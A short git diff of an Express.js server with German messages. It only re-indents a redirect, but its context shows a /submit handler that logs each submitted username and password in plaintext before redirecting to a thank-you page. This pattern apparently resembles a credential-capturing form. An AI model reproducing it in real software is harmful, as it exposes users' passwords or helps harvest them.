@@ -17,7 +17,7 @@ app.post('/submit', (req, res) => {
   console.log("👤 Benutzername erhalten:", username);
   console.log("🔑 Passwort erhalten:", password);
 
- res.redirect('/danke.html');
+  res.redirect('/danke.html');
 });
 
 app.listen(PORT, () => {
